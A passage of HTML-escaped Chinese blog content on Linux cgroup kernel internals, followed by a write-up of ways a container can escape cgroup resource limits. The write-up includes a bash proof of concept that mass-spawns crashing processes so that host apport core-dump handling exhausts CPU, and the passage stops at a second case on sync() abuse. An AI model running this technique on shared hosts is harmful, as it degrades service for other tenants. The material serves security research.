    struct list_head sibling;         // 兄弟节点链表
    struct list_head children;        // 子节点链表
    struct cgroup *parent;            // 父节点 

    struct list_head files;           /* my files */ 
    struct dentry *dentry;            // 该cgroup对应的目录的描述 
    struct cgroupfs_root *root;  // 指向hierarchy结构体，每个cgroup文件系统都有一个cgroupfs_root，在mount时创建

    struct cgroup_subsys_state __rcu *subsys[CGROUP_SUBSYS_COUNT];  // 提供给各子系统的限制资源统计数据

    struct list_head cset_links; 
    struct list_head e_csets[CGROUP_SUBSYS_COUNT]; // 使用的所有子系统的每个链表
    … 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;大致可以分为4部分：&lt;/p&gt;
&lt;h5 id=&#34;1层级结构成员&#34;&gt;1.层级结构成员&lt;/h5&gt;
&lt;p&gt;用于描述cgroup层级结构的成员，包括&lt;code&gt;sibling children parent&lt;/code&gt;三个成员；&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454873202.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h5 id=&#34;2文件描述相关成员&#34;&gt;2.文件描述相关成员&lt;/h5&gt;
&lt;p&gt;包括&lt;code&gt;files dentry root&lt;/code&gt;三个成员。&lt;/p&gt;
&lt;p&gt;内核cgroup子系统创造了名为cgroup的虚拟文件系统。每个cgroup节点都和此文件系统中的一个目录相联系。&lt;/p&gt;
&lt;p&gt;结构体中成员&lt;code&gt;dentry *dentry&lt;/code&gt;指向与之相关联的目录，成员&lt;code&gt;list_head files&lt;/code&gt;指向目录下的文件，成员&lt;code&gt;cgroupfs_root *root&lt;/code&gt;指向cgroup文件系统的根节点。&lt;/p&gt;
&lt;h5 id=&#34;3子系统相关成员&#34;&gt;3.子系统相关成员&lt;/h5&gt;
&lt;p&gt;首先先看&lt;code&gt;cgroup_subsys&lt;/code&gt;结构体：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cgroup_subsys&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;cgroup通过此结构体操作各个子系统，每个子系统都需要实现这样的一个结构体。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;struct cgroup_subsys {
    struct cgroup_subsys_state *(*create)(struct cgroup_subsys *ss,
                          struct cgroup *cgrp);
    void (*pre_destroy)(struct cgroup_subsys *ss, struct cgroup *cgrp);
    void (*destroy)(struct cgroup_subsys *ss, struct cgroup *cgrp);
    int (*can_attach)(struct cgroup_subsys *ss,
              struct cgroup *cgrp, struct task_struct *tsk);
    void (*attach)(struct cgroup_subsys *ss, struct cgroup *cgrp,
            struct cgroup *old_cgrp, struct task_struct *tsk);
    void (*fork)(struct cgroup_subsys *ss, struct task_struct *task);
    void (*exit)(struct cgroup_subsys *ss, struct task_struct *task);
    int (*populate)(struct cgroup_subsys *ss,
            struct cgroup *cgrp);
    void (*post_clone)(struct cgroup_subsys *ss, struct cgroup *cgrp);
    void (*bind)(struct cgroup_subsys *ss, struct cgroup *root);

    int subsys_id; // 表示了子系统的ID
    int active; // 表示子系统是否被激活
    int disabled; // 子系统是否被禁止
    int early_init;
    const char *name; // 子系统名称
    struct cgroupfs_root *root; // 被附加到的层级挂载点
    struct list_head sibling; // 用于连接被附加到同一个层级的所有子系统
    void *private; // 私有数据
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;cgroup_subsys&lt;/code&gt; 结构包含了很多函数指针，通过这些函数指针，cgroup可以对子系统进行一些操作。例如向 cgroup 的 tasks 文件添加要控制的进程PID时，就会调用 &lt;code&gt;cgroup_subsys&lt;/code&gt; 结构的 &lt;code&gt;attach()&lt;/code&gt; 函数。当在层级中创建新目录时，就会调用 &lt;code&gt;create()&lt;/code&gt; 函数创建一个子系统的资源控制统计信息对象 &lt;code&gt;cgroup_subsys_state&lt;/code&gt;，并且调用 &lt;code&gt;populate()&lt;/code&gt; 函数创建子系统相关的资源控制信息文件。&lt;/p&gt;
&lt;p&gt;每个subsys有自己的属性和操作，用相同的结构体来描述subsys有点太困难，cgroup_subsys描述的是subsys通用的部分，各种不同的子系统是有自己的结构体的。&lt;/p&gt;
&lt;p&gt;例如内存子系统：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct cgroup_subsys mem_cgroup_subsys = {
    .name = &amp;quot;memory&amp;quot;,
    .subsys_id = mem_cgroup_subsys_id,
    .create = mem_cgroup_create,
    .pre_destroy = mem_cgroup_pre_destroy,
    .destroy = mem_cgroup_destroy,
    .populate = mem_cgroup_populate,
    .attach = mem_cgroup_move_task,
    .early_init = 0,
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;另外 Linux 内核还定义了一个 &lt;code&gt;cgroup_subsys&lt;/code&gt; 结构的数组 &lt;code&gt;subsys&lt;/code&gt;，用于保存所有子系统的 &lt;code&gt;cgroup_subsys&lt;/code&gt; 结构，如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;static struct cgroup_subsys *subsys[] = {
    cpuset_subsys,
    debug_subsys,
    ns_subsys,
    cpu_cgroup_subsys,
    cpuacct_subsys,
    mem_cgroup_subsys
};
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cgroup_subsys_state&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;结构体&lt;code&gt;cgroup_subsys_state&lt;/code&gt;是一个&amp;quot;中介&amp;quot;，介于结构体&lt;code&gt;cgroup&lt;/code&gt;和结构体&lt;code&gt;cgroup_subsys&lt;/code&gt;之间。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// include/linux/cgroup.h
struct cgroup_subsys_state {

    // 本subsys所依附的cgroup
    struct cgroup *cgroup;

    // 用到的子系统
    struct cgroup_subsys *ss;
    ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到其中并不包含子系统的相关资源统计信息，而真正的信息是存在具体子系统结构体中的。&lt;/p&gt;
&lt;p&gt;例如mem_cgroup:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct mem_cgroup {
    struct cgroup_subsys_state css;
    struct res_counter res;
    struct mem_cgroup_lru_info info;
    int prev_priority;
    struct mem_cgroup_stat stat;
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第一个字段就是指向&lt;code&gt;cgroup_subsys_state&lt;/code&gt;，除此之外，其余部分信息由mem_cgroup自己维护，因此他们之间的关系：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454888137.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;cgroup&lt;/code&gt;和&lt;code&gt;cgroup_subsys_state&lt;/code&gt;的关系：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454896518.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h5 id=&#34;4进程相关成员&#34;&gt;4.进程相关成员&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;cset_links&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;cgroup节点和进程是多对多映射。一个cgrou节点中可以有多个进程，一个进程也可以加入多个cgroup。&lt;/p&gt;
&lt;p&gt;假设有 3 个进程，4 个控制组，进程 1 用到控制组 1 和 3，进程 2 用到控制组 2 和 4，进程 3 用到控制组 2 和 4。从进程的角度看和从控制组的角度看，如图所示。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621996726696.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;在结构cgroup中有：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// include/linux/cgroup.h 
struct cgroup { 
… 
    struct list_head cset_links; 
… 
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结构 cgroup 的成员 &lt;code&gt;cset_links&lt;/code&gt; 和另一个结构 &lt;code&gt;cgrp_cset_link&lt;/code&gt; 关联：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;kernel/cgroup.c 
struct cgrp_cset_link { 
    /* the cgroup and css_set this link associates */ 
    struct cgroup *cgrp; 
    struct css_set *cset; 
    /* list of cgrp_cset_links anchored at cgrp-&amp;gt;cset_links */ 
    struct list_head cset_link; 
    /* list of cgrp_cset_links anchored at css_set-&amp;gt;cgrp_links */ 
    struct list_head cgrp_link; 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;联系在一起，还是上面那个例子，内核中的数据结构如图所示。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1621996916634.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;cgroup_root&lt;/code&gt;和&lt;code&gt;cgroup&lt;/code&gt;是使用两个不同结构表示的。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454918787.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454944616.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;文件系统接口&#34;&gt;文件系统接口&lt;/h3&gt;
&lt;p&gt;cgroup文件系统是cgroup提供给用户层的控制接口，cgroup文件系统挂不挂载，cgroup都是生效运行的。&lt;/p&gt;
&lt;h4 id=&#34;mount函数&#34;&gt;mount函数&lt;/h4&gt;
&lt;p&gt;挂载最终会调用到内核函数&lt;code&gt;cgroup_get_sb()&lt;/code&gt;，其中比较重要的部分：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static int cgroup_get_sb(struct file_system_type *fs_type,
     int flags, const char *unused_dev_name,
     void *data, struct vfsmount *mnt)
{
    ...
    struct cgroupfs_root *root;
    ...
    root = kzalloc(sizeof(*root), GFP_KERNEL);
    ...
    ret = rebind_subsystems(root, root-&amp;gt;subsys_bits);
    ...

    struct cgroup *cgrp = &amp;amp;root-&amp;gt;top_cgroup;

    cgroup_populate_dir(cgrp);
    ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首先会调用 &lt;code&gt;kzalloc()&lt;/code&gt; 函数创建一个 &lt;code&gt;cgroupfs_root&lt;/code&gt; 结构。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cgroupfs_root&lt;/code&gt;结构主要用于描述这个挂载点的信息：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;struct cgroupfs_root {
    struct super_block *sb; // 挂载的文件系统超级块
    unsigned long subsys_bits; // 附加到此层级的子系统标志
    unsigned long actual_subsys_bits; // 附加到此层级的子系统标志
    struct list_head subsys_list; // 附加到此层级的子系统(cgroup_subsys)列表
    struct cgroup top_cgroup; // 此层级的根cgroup
    int number_of_cgroups; // 层级中有多少个cgroup
    struct list_head root_list; // 连接系统中所有的cgroupfs_root
    unsigned long flags; // 标志位
    char release_agent_path[PATH_MAX];
}; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中比较重要的是&lt;code&gt;subsys_list&lt;/code&gt;，表示附加到此层级上的所有子系统；&lt;code&gt;top_cgroup&lt;/code&gt;字段表示此层级的根&lt;code&gt;cgroup&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;然后调用&lt;code&gt;rebind_subsystems()&lt;/code&gt;函数，把挂载时指定的子系统添加到&lt;code&gt;cgroupsfs_root&lt;/code&gt;结构实例&lt;code&gt;root.subsys_list&lt;/code&gt;链表上，并且为此层级结构的根&lt;code&gt;cgroup.subsys&lt;/code&gt;字段设置各个子系统的资源控制统计信息对象。&lt;/p&gt;
&lt;p&gt;最后调用&lt;code&gt;cgroup_populate_dir()&lt;/code&gt;函数向挂载目录创建管理文件。&lt;/p&gt;
&lt;h4 id=&#34;attach函数&#34;&gt;attach函数&lt;/h4&gt;
&lt;p&gt;当向tasks文件中写入pid时，会用调用&lt;code&gt;attach_task_by_pid()&lt;/code&gt;函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;static int attach_task_by_pid(struct cgroup *cgrp, char *pidbuf)
{
    pid_t pid;
    struct task_struct *tsk;
    int ret;

    if (sscanf(pidbuf, &amp;quot;%d&amp;quot;, &amp;amp;pid) != 1) // 读取进程pid
        return -EIO;

    if (pid) { // 如果有指定进程pid
        ...
        tsk = find_task_by_vpid(pid); // 通过pid查找对应进程的进程描述符
        if (!tsk || tsk-&amp;gt;flags &amp;amp; PF_EXITING) {
            rcu_read_unlock();
            return -ESRCH;
        }
        ...
    } else {
        tsk = current; // 如果没有指定进程pid, 就使用当前进程
        ...
    }

    ret = cgroup_attach_task(cgrp, tsk); // 调用 cgroup_attach_task() 把进程添加到cgroup中
    ...
    return ret;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此函数中会先判断是否指定了pid，如果没有指定则默认为当前进程，然后调用&lt;code&gt;cgroup_attach_task()&lt;/code&gt;函数把进程添加到&lt;code&gt;cgroup&lt;/code&gt;中。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cgroup_attach_task()&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int cgroup_attach_task(struct cgroup *cgrp, struct task_struct *tsk)
{
    int retval = 0;
    struct cgroup_subsys *ss;
    struct cgroup *oldcgrp;
    struct css_set *cg = tsk-&amp;gt;cgroups;
    struct css_set *newcg;
    struct cgroupfs_root *root = cgrp-&amp;gt;root;

    ...
    newcg = find_css_set(cg, cgrp); // 根据新的cgroup查找css_set对象
    ...
    rcu_assign_pointer(tsk-&amp;gt;cgroups, newcg); // 把进程的cgroups字段设置为新的css_set对象
    ...
    // 把进程添加到css_set对象的tasks列表中
    write_lock(&amp;amp;css_set_lock);
    if (!list_empty(&amp;amp;tsk-&amp;gt;cg_list)) {
        list_del(&amp;amp;tsk-&amp;gt;cg_list);
        list_add(&amp;amp;tsk-&amp;gt;cg_list, &amp;amp;newcg-&amp;gt;tasks);
    }
    write_unlock(&amp;amp;css_set_lock);

    // 调用各个子系统的attach函数
    for_each_subsys(root, ss) {
        if (ss-&amp;gt;attach)
            ss-&amp;gt;attach(ss, cgrp, oldcgrp, tsk);
    }
    ...
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此函数首先会&lt;code&gt;find_css_set()&lt;/code&gt;函数&lt;strong&gt;查找或创建&lt;/strong&gt;一个&lt;code&gt;css_set&lt;/code&gt;对象，此&lt;code&gt;css_set&lt;/code&gt;对象包含了该进程所在的&lt;code&gt;cgroup&lt;/code&gt;中所包含的子系统，通过&lt;code&gt;css_set&lt;/code&gt;能快速查询到该进程被限制的资源。&lt;/p&gt;
&lt;p&gt;然后把进程实例&lt;code&gt;tsk.cgroup&lt;/code&gt;字段设置成该&lt;code&gt;css_set&lt;/code&gt;，然后把此进程添加到&lt;code&gt;css_set.tasks&lt;/code&gt;列表中，表示关联此&lt;code&gt;css_set&lt;/code&gt;的进程列表。&lt;/p&gt;
&lt;p&gt;最后调用层级结构上的所有子系统的&lt;code&gt;attach()&lt;/code&gt;函数，对新增进程进行一系列其它操作(具体子系统处理会有所不同)。&lt;/p&gt;
&lt;h3 id=&#34;各个子系统的实现&#34;&gt;各个子系统的实现&lt;/h3&gt;
&lt;p&gt;上面可以知道，内核中的cgroup机制提供一个框架，通过在其中添加子系统，可以实现对进程的不同资源进行限制。以cpuacct为例，其子系统实现在kernel/sched/cpuacct.c，这是在调度系统里添加的一个子系统，用于进程占用时间片的统计。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;struct cgroup_subsys cpuacct_subsys = {
	.name		= &amp;quot;cpuacct&amp;quot;,
	.css_alloc	= cpuacct_css_alloc,
	.css_free	= cpuacct_css_free,
	.subsys_id	= cpuacct_subsys_id,
	.base_cftypes	= files,
	.early_init	= 1,
};
static struct cftype files[] = {
	{
		.name = &amp;quot;usage&amp;quot;,
		.read_u64 = cpuusage_read,
		.write_u64 = cpuusage_write,
	},
	{
		.name = &amp;quot;usage_percpu&amp;quot;,
		.read_seq_string = cpuacct_percpu_seq_read,
	},
	{
		.name = &amp;quot;stat&amp;quot;,
		.read_map = cpuacct_stats_show,
	},
	{ }	/* terminate */
};
/* track cpu usage of a group of tasks and its child groups */
struct cpuacct {
	struct cgroup_subsys_state css;
	/* cpuusage holds pointer to a u64-type object on every cpu */
	u64 __percpu *cpuusage;
	struct kernel_cpustat __percpu *cpustat;
};
void cpuacct_charge(struct task_struct *tsk, u64 cputime)
{
	struct cpuacct *ca;
	int cpu;

	cpu = task_cpu(tsk);

	rcu_read_lock();

	ca = task_ca(tsk);

	while (true) {
		u64 *cpuusage = per_cpu_ptr(ca-&amp;gt;cpuusage, cpu);
		*cpuusage += cputime;

		ca = parent_ca(ca);
		if (!ca)
			break;
	}

	rcu_read_unlock();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;cpuacct实现很简单，定义了cpuacct_subsys，它的属性只有三个，内嵌cgroup_subsys_state的结构体也只有两个额外的percpu变量。其运行原理是在进程调度的时候调用cpuacct_charge将进程运行时间记录到进程相关的cgroup的cpuacct子系统的结构体中。在用户读相关cgroup文件的时候将其打印出来。&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;cgroup的组指的是一组进程。如果不做干预，进程创建的子进程会被自动加入到进程所在的控制组之中。控制组的优点是可以针对一组数量不定的进程进行控制和统计。&lt;/p&gt;
&lt;p&gt;控制组没有增加新的系统调用，而是实现了一种新的文件系统 cgroup。有了 cgroup 文件系统，创建和删除控制组就转化为创建和删除目录，查看资源使用情况和调整参数就转化为读写文件。相比系统调用，操作文件无疑更加方便。&lt;/p&gt;
">【linux】Cgroups</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/rong-qi-rao-guo-cgroup-xian-zhi-ce-lue/"" data-c="
          &lt;ol&gt;
&lt;li&gt;异常的内核处理机制&lt;/li&gt;
&lt;li&gt;文件系统和I/O设备&lt;/li&gt;
&lt;li&gt;linux日志系统&lt;/li&gt;
&lt;li&gt;容器引擎和软中断的处理&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;1-策略&#34;&gt;1 策略&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;利用内核的&lt;strong&gt;Upcalls&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;由于cgroup的继承机制，一个进程所fork或clone出的子进程都会继承该进程的cgroup限制。因为内核进程是由内核创建的，所以所有内核进程都会attach到根cgroup。因此所有由内核进程通过fork或clone创建的进程都会attach到它们父进程(内核进程)所属的同一个cgroup(根cgroup)上。&lt;/p&gt;
&lt;p&gt;因此，一个cgroup内的进程可以利用内核进程作为代理来生成新的进程，从而逃脱cgroup的控制。首先进程&lt;strong&gt;p&lt;/strong&gt;可以触发内核来初始化一个内核进程&lt;strong&gt;K&lt;/strong&gt;，这个内核进程&lt;strong&gt;K&lt;/strong&gt;作为代理，进一步创建一个新进程&lt;strong&gt;M&lt;/strong&gt;，这个新进程也会attach到根cgroup。因此&lt;strong&gt;M&lt;/strong&gt;相当于一个不受cgroup限制的进程。&lt;/p&gt;
&lt;p&gt;这种机制要求用户空间进程先调用内核空间中的内核函数，然后从内核空间向上调用用户空间进程。虽然从用户空间调用特定的内核函数很自然(例如系统调用)，但相反的方向并不常见。一个可行的方式是通过usermode helperAPI，&lt;mark&gt;它通过提供可执行变量和环境变量的名称&lt;/mark&gt;，为在用户空间中创建进程提供了一个简单的接口。这个函数首先调用一个在内核进程中运行的工作队列(workerqueue例如&lt;strong&gt;kworker&lt;/strong&gt;)，工作队列的处理程序函数进一步创建一个内核进程来启动用户进程。最后一步调用内核中的fork函数，将创建的用户进程附加到内核进程的cgroups。&lt;/p&gt;
&lt;p&gt;usermode-helper API，&lt;a href=&#34;http://edsionte.com/techblog/archives/category/linux%E5%86%85%E6%A0%B8%E7%BC%96%E7%A8%8B&#34;&gt;参考1&lt;/a&gt;，&lt;a href=&#34;https://www.cnblogs.com/fastwave2004/articles/4316958.html&#34;&gt;参考2&lt;/a&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将工作负载委托给内核线程&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;内核会运行多种进程去处理各种内核函数并且在进程上下文中运行内核代码。例如，内核守护进程&lt;code&gt;kthreadd&lt;/code&gt;创建其它内核线程；&lt;code&gt;kworker&lt;/code&gt;处理工作队列中的任务；&lt;code&gt;ksoftirqd&lt;/code&gt;服务软中断；&lt;code&gt;Migration&lt;/code&gt;执行迁移任务，将任务从一个核心移动到另一个核心...&lt;/p&gt;
&lt;p&gt;有不少文章提到这些内核进程会消耗大量的资源：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.redhat.com/archives/nahant-list/2006-March/msg00033.html&#34;&gt;kswapd taking 100% CPU&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://askubuntu.com/questions/33640/kworker-what-is-it-and-why-is-it-hogging-so-much-cpu&#34;&gt;Kworker, what is it and why is it hogging so much CPU?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://askubuntu.com/questions/7858/why-is-ksoftirqd-0-process-using-all-of-my-cpu&#34;&gt;Why  is  ksoftirqd/0  process  using  all  of  my  CPU?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://askubuntu.com/questions/806238/kworker-shows-very-high-cpu-usage&#34;&gt;Kworker shows very high CPU usage.&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;利用服务进程&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;除了内核进程，linux还运行了许多系统进程，例如进程管理、系统信息日志、debugging等等。这些进程监控其它进程并且在特定条件下触发生成工作负载。还有一些用户空间的进程是为了为其它进程提供依赖。如果用户空间进程能够触发某些条件可以生成这些内核负载，那么这些工作负载也不会被cgroup限制。&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;利用中断上下文&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;cgroup机制只会计算进程上下文所消耗的资源。&lt;mark&gt;一旦内核运行在其它上下文中，所有的资源消耗将不再计入任何的cgroup&lt;/mark&gt;。&lt;/p&gt;
&lt;p&gt;linux内核服务中断管理分为两部分：top half(硬件中断)和bottom half(软件中断)。&lt;/p&gt;
&lt;p&gt;由于硬件中断可能会随时发生，因此top half只会执行轻量级的操作，然后再交给bottom half处理。&lt;mark&gt;当bottom half在执行中断处理程序的时候，内核是运行在软件中断上下文中，因此it will not charge any process for the system resources&lt;/mark&gt;。&lt;/p&gt;
&lt;p&gt;内核版本3.6以后，软中断的处理与产生它们的进程相绑定，这意味着softirq上下文中消耗的资源将不会算在触发中断的进程的配额中。因此softirqs的执行将会抢占当前进程的任何工作负载，并且所有进程都将被延迟。&lt;/p&gt;
&lt;p&gt;此外，如果处理软中断的工作负载过重，内核将把他们卸载到内核线程softirqd，它是一个CPU内核线程，并以默认故障继承的优先级运行。一旦卸载，软中断处理就在softirqd进程上下文中运行，因此任何资源的消耗都会算在进程softirqd上。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;总之，如果一个进程能够引起大量的软件中断，那么内核不得不消耗大量资源来处理它，无论是中断上下文还是ksoftirqd进程上下文，而这些资源消耗不会算在该进程上。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;总结：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;触发内核线程的工作量，使其消耗大量资源&lt;/li&gt;
&lt;li&gt;使内核进程创建子进程，使子进程与内核进程同属于一个cgroup，由子进程消耗大量资源&lt;/li&gt;
&lt;li&gt;触发当前操作系统中服务进程消耗资源&lt;/li&gt;
&lt;li&gt;利用中断上下文来消耗资源&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-case&#34;&gt;2 Case&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;case 1(策略1)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;利用内核中的异常处理机制。容器所引发的异常可以调用用户空间的进程，结果是容器可以消耗比设定资源高出200倍的效果。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;detail：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;linux内核为各种异常提供了专用的异常处理程序，包括错误(例如divided error)和trap(例如overflow)。内核维护一个IDT(中断描述表)，其中包含每个中断或异常处理程序的地址。如果CPU在用户态中引发异常，则在内核态中处理相应的处理程序。处理器首先将寄存器保存在内核堆栈中，相应地处理异常，最后返回到用户模式。整个过程在内核空间和触发异常的进程上下文中进行。因此会进行正确的cgroup限制。&lt;/p&gt;
&lt;p&gt;然而，这些异常将导致初始进程的终止并引发异常信号。这些信号将会进一步触发core dump内核函数去生成一个用于debug的core dump文件。内核的core dump代码会通过usermode helper API从内核调用用户空间的应用程序。在ubuntu中，默认的用户空间core dump应用程序是apport，他会出现在任何异常时触发。而apport不是由容器进程所派生的，所以消耗的系统资源是不会算在容器中的。&lt;/p&gt;
&lt;p&gt;为了达到负载均衡，新生成的apport进程实例将被内核调度到所有的CPU内核，从而逃离cpusets cgroup。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;exp：&lt;/strong&gt;&lt;br&gt;
由于apport进程的运行比轻量级异常处理消耗更多额资源，如果容器不断引发异常，整个CPU将被apport进程完全占用，cpu cgroup的溢出导致大量占用分配给容器的系统资源。&lt;/p&gt;
&lt;p&gt;为了衡量恶意容器所带给其它容器的影响，在其它容器上运行sysbench。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 前置条件，8核CPU
mkdir /root/exception &amp;amp;&amp;amp; cd /root/exception

cat &amp;gt; exception.c &amp;lt;&amp;lt; EOF
int main()
{
    int a = 1/0;
    return 0;
}
EOF

cat &amp;gt; exception_loop.sh &amp;lt;&amp;lt; EOF
for i in $(seq 1 1000):
do
    ./exception.out &amp;amp;
done
EOF


docker build -t exception_test .

# 一共启动三个终端

# 在第一个终端启动htop观察系统资源消耗

# 在第二个终端启动
docker stats

# 在第三个终端启动一个容器
docker run --rm -it --name exception_test_normal exception_test
# 在容器中用sysbench测试
sysbench --test=cpu --cpu-max-prime=200 --threads=4 --time=20 run
# 在htop终端可以观察到有4个核的CPU消耗
# 退出
# 重新创建一个容器，指定CPU，并限制资源使用
docker run --rm -it --cpus=0.5 --cpuset-cpus=1 -m=2G --name exception_test_limited exception_test
# 在重新运行sysbench
sysbench --test=cpu --cpu-max-prime=200 --threads=4 --time=20 run
# 会发现容器没有超过指定的资源消耗量
# 此时运行脚本
bash exception_loop.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;case 2(策略2)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;利用回写机制进行磁盘的数据同步。容器可以不断调用全局数据同步，以降低主机上的特定I/O工作负载，最高可达95%。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;detail：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这种情况是利用磁盘数据同步的回写机制，CPU只将更新后的数据写入缓存buffer，当缓存被移除后或达到特定条件，数据才会写入磁盘，其目的是减少开销，降低磁盘读写次数。&lt;/p&gt;
&lt;p&gt;flusher进程负责将dirty页写入磁盘，flusher进程写回dirty页的触发机制有两类：一是当空闲内存低于一定值或者dirty页比例超过一定值等某项指标达到某个阈值时；另一种就是当用户进程调用了&lt;code&gt;sync()&lt;/code&gt;或&lt;code&gt;fsync()&lt;/code&gt;系统调用时。&lt;/p&gt;
&lt;p&gt;这种回写机制其中一个缺点是导致其它进程在等待磁盘时被阻塞。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sync()&lt;/code&gt;系统调用：第一步启动一个&lt;strong&gt;内核进程&lt;/strong&gt;，将所有dirty页的数据flush并写入磁盘，而此时所有I/O操作必须等待，而且其它进程生成的dirty页也将被迫写回磁盘。因此可以在一个恶意容器中不断运行调用&lt;code&gt;sync()&lt;/code&gt;，其它容器在进行写操作会导致大量的CPU等待时间(CPU等待时间指I/O等待所消耗的时间)，这是&lt;code&gt;sync()&lt;/code&gt;和写操作产生的。&lt;a href=&#34;http://byteliu.com/2019/03/09/Linux-IO%E5%90%8C%E6%AD%A5%E5%87%BD%E6%95%B0-sync%E3%80%81fsync%E3%80%81fdatasync/&#34;&gt;sync参考&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;而blkio cgroup子系统无法限制同步机制所消耗的资源，其原因是&lt;code&gt;sync()&lt;/code&gt;启动的进程在内核空间。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;exp：&lt;/strong&gt;&lt;br&gt;
